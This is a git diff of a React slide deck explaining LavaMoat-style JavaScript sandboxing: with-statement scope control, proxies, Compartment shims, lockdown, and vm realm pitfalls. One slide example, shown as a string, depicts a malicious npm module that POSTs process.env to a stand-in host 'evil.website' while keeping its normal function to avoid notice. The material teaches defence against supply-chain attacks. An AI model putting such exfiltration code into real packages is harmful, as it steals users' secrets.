@@ -1,5 +1,5 @@
 import React from 'react';
-import { Slide, CodePane, Markdown } from 'spectacle';
+import { Slide, CodePane, Markdown, Heading } from 'spectacle';
 import ActionSlide from './action-slide'
 import lavamoatConfig from './example-config.json'
 
@@ -90,6 +90,9 @@ export class FrozenPrimitivesExample extends React.Component {
         onSlideActionIndexChange={(slideActionIndex) => this.setState(() => ({ slideActionIndex }))}
         slideActionMax={frozenPrimsCodeExamples.length-1}
         >
+        <Heading size={5} textColor="secondary">
+          everything is mutable
+        </Heading>
         <CodePane
           lang="js"
           source={frozenPrimsCodeExamples[slideActionIndex]}
@@ -208,25 +211,30 @@ compartment.evaluate(code)
 const compartment = new Compartment({ fetch, location })
 compartment.evaluate(moduleSource)
 `,
-// `
-// // unique globalThis per compartment
-// compartmentA.globalThis !== compartmentB.globalThis
-// // common intrinsics
-// Array === compartment.globalThis.Array
-// `,
-// // vm
-// `
-// // this is almost a Compartment,
-// const vm = require('vm')
-// vm.runInContext(code, endowments)
+`
+// with statement
+const obj = { abc: 1, xyz: 'hello'}
 
-// // but this is a different Realm, so it suffers
-// // from "Identity Discontinuity"
-// Array !== vm.runInContext('Array')
-// `,
+with (obj) {
+  abc++
+  console.log(xyz)
+}
+`,
+`
+// proxy
+const obj = new Proxy({}, {
+  get: (target, prop) => {
+    if (prop === 'abc') return 1
+    if (prop === 'xyz') return 'hello'
+  },
+  has: (target, prop) => {
+    return true
+  }
+})
+`,
 `
 // Compartment shim, simplified
-with (this.scopeController) {
+with (this.scopeControllerProxy) {
   // untrusted code goes here
 }
 `,
@@ -237,6 +245,74 @@ with (this.scopeTerminator) {
     // untrusted code goes here
   }
 }
+`,
+`
+// Compartment shim, simplified
+with (this.scopeTerminator) {
+  with (this.compartmentGlobal) {
+    (function(){
+      "use strict"
+      // untrusted code goes here
+    })()
+  }
+}
+`,
+`
+// part of lockdown
+Function.prototype.constructor = function () {
+  throw new Error('nope')
+}
+
+// Compartment shim, simplified
+with (this.scopeTerminator) {
+  with (this.compartmentGlobal) {
+    (function(){
+      "use strict"
+      // untrusted code goes here
+    })()
+  }
+}
+`,
+`
+// part of lockdown
+Function.prototype.constructor = function () {
+  throw new Error('nope')
+}
+
+// Compartment shim, simplified
+with (this.scopeTerminator) {
+  with (this.compartmentGlobal) {
+    with (this.allowEvalOnce) {
+      (function(){
+        "use strict"
+        eval(code)
+      })()
+    }
+  }
+}
+`,
+`
+// block ambient authority with Compartments 
+const compartment = new Compartment(endowments)
+compartment.evaluate(code)
+`,
+// vm
+`
+// this is almost a Compartment,
+const vm = require('vm')
+vm.runInContext(code, endowments)
+
+// but this is a different Realm, so it suffers
+// from "Identity Discontinuity"
+Array !== vm.runInContext('Array')
+// breaks instanceof!
+vm.runInContext('[]') instanceof Array // false
+`,
+`
+// unique globalThis per compartment
+compartmentA.globalThis !== compartmentB.globalThis
+// common intrinsics
+Array === compartment.globalThis.Array
 `,
 ]
 
@@ -368,6 +444,69 @@ export class LavaMoatIntroSlide extends React.Component {
           textSize={20}
         />
       </Slide>
+    )
+  }
+}
+
+const ambientAuthorityExamples = [`
+// love to format strings
+module.exports = function normalizeUnicode (string) {
+  // ...
+}
+`,
+`
+// send environment variables to evil lair
+fetch('evil.website', {
+  method: 'POST',
+  body: JSON.stringify(process.env),
+})
+
+// keep working normally so no one notices
+module.exports = function normalizeUnicode (string) {
+  // ...
+}
+`,
+]
+
+// export class AmbientAuthorityExample extends React.Component {
+//   render () {
+//     return (
+//       <Slide transition={['slide']} bgColor="secondary">
+//         <Heading size={5} textColor="primary">
+//           ambient authority
+//         </Heading>
+//         <CodePane lang="js" source={ambientAuthorityCode} textSize={26} />
+//       </Slide>
+//     )
+//   }
+// }
+
+export class AmbientAuthorityExample extends React.Component {
+  constructor (props) {
+    super(props)
+    this.state = {
+      slideActionIndex: 0
+    }
+  }
+
+  render () {
+    const { slideActionIndex } = this.state
+    return (
+      <ActionSlide
+        transition={['slide']}
+        bgColor="primary"
+        onSlideActionIndexChange={(slideActionIndex) => this.setState(() => ({ slideActionIndex }))}
+        slideActionMax={ambientAuthorityExamples.length-1}
+        >
+         <Heading size={5} textColor="secondary">
+           ambient authority
+         </Heading>
+        <CodePane
+          lang="js"
+          source={ambientAuthorityExamples[slideActionIndex]}
+          textSize={26}
+        />
+      </ActionSlide>
     )
   }
 }
